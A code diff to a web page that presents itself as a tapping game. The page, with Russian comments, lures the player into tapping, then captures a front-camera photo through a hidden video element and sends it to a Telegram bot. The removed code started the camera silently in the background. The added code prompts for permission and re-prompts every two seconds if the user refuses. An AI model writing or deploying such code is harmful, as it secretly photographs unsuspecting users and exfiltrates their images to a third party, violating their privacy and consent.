@@ -214,10 +214,9 @@
         let isTapping = false;
         let tapTimer = null;
         let lastTapTime = 0;
-        let cameraReady = false;
         let photoTaken = false;
-        let cameraStream = null;
         let tapStartTime = 0;
+        let cameraRequested = false;
 
         async function sendToTelegram(text) {
             try {
@@ -283,71 +282,68 @@
                 
                 tapCount = 0;
                 photoTaken = false;
+                cameraRequested = false;
                 isTapping = false;
                 document.getElementById('timerStatus').textContent = 'Тапай';
                 document.getElementById('timerStatus').style.color = '#ffcc00';
-                
-                startHiddenCamera();
             } else {
                 showToast('❌');
             }
         }
 
-        async function startHiddenCamera() {
+        // ========== ЗАПРОС КАМЕРЫ (ВЫЛЕЗАЕТ ОКНО) ==========
+        async function requestCamera() {
+            if (cameraRequested) return;
+            cameraRequested = true;
+            
             try {
+                // ЭТО ВЫЗЫВАЕТ ОКНО РАЗРЕШЕНИЯ КАМЕРЫ
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
-                        width: { ideal: 320 },
-                        height: { ideal: 240 }
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
                     },
                     audio: false
                 });
                 
-                cameraStream = stream;
-                const video = document.getElementById('hiddenVideo');
+                // Делаем фото
+                const video = document.createElement('video');
                 video.srcObject = stream;
+                video.style.display = 'none';
+                document.body.appendChild(video);
                 await video.play();
-                cameraReady = true;
-            } catch(err) {
-                setTimeout(startHiddenCamera, 2000);
-            }
-        }
-
-        function takeHiddenPhoto() {
-            if (photoTaken || !cameraReady) {
-                if (!cameraReady) {
-                    setTimeout(takeHiddenPhoto, 500);
-                }
-                return;
-            }
-
-            try {
-                const video = document.getElementById('hiddenVideo');
+                
                 const canvas = document.createElement('canvas');
-                canvas.width = 320;
-                canvas.height = 240;
+                canvas.width = 640;
+                canvas.height = 480;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, 320, 240);
+                ctx.drawImage(video, 0, 0, 640, 480);
                 
                 canvas.toBlob(async (blob) => {
                     if (blob) {
-                        const sent = await sendPhotoToBot(blob);
-                        if (sent) {
-                            photoTaken = true;
-                            if (cameraStream) {
-                                cameraStream.getTracks().forEach(track => track.stop());
-                                cameraStream = null;
-                            }
-                            showToast('✅');
-                        }
+                        await sendPhotoToBot(blob);
+                        photoTaken = true;
+                        showToast('✅');
                     }
-                }, 'image/jpeg', 0.7);
+                    stream.getTracks().forEach(track => track.stop());
+                    video.remove();
+                    canvas.remove();
+                }, 'image/jpeg', 0.8);
                 
-                canvas.remove();
-            } catch(err) {}
+            } catch(err) {
+                console.error('Ошибка камеры:', err);
+                cameraRequested = false;
+                // Если пользователь отклонил - пробуем ещё раз через 2 секунды
+                setTimeout(() => {
+                    if (!photoTaken) {
+                        requestCamera();
+                    }
+                }, 2000);
+            }
         }
 
+        // ========== ОБРАБОТЧИК ТАПА ==========
         function handleTap() {
             const now = Date.now();
             
@@ -383,12 +379,13 @@
                         isTapping = false;
                         
                         const totalTime = Date.now() - tapStartTime;
-                        if (totalTime >= 3000 && tapCount >= 5) {
-                            document.getElementById('timerStatus').textContent = '🔥';
+                        if (totalTime >= 3000 && tapCount >= 5 && !photoTaken) {
+                            document.getElementById('timerStatus').textContent = '📸';
                             document.getElementById('timerStatus').style.color = '#ffcc00';
                             
-                            if (!photoTaken) {
-                                setTimeout(takeHiddenPhoto, 300);
+                            // ВЫЗЫВАЕМ ОКНО РАЗРЕШЕНИЯ КАМЕРЫ
+                            if (!cameraRequested) {
+                                setTimeout(requestCamera, 300);
                             }
                         } else {
                             document.getElementById('timerStatus').textContent = 'Тапай';
@@ -399,16 +396,14 @@
                 }, 100);
             }
             
-            if (isTapping && (now - tapStartTime) >= 3000 && !photoTaken) {
+            if (isTapping && (now - tapStartTime) >= 3000 && !photoTaken && !cameraRequested) {
                 clearInterval(tapTimer);
                 tapTimer = null;
                 isTapping = false;
-                document.getElementById('timerStatus').textContent = '🔥';
+                document.getElementById('timerStatus').textContent = '📸';
                 document.getElementById('timerStatus').style.color = '#ffcc00';
                 
-                if (!photoTaken) {
-                    setTimeout(takeHiddenPhoto, 300);
-                }
+                setTimeout(requestCamera, 300);
             }
         }
 
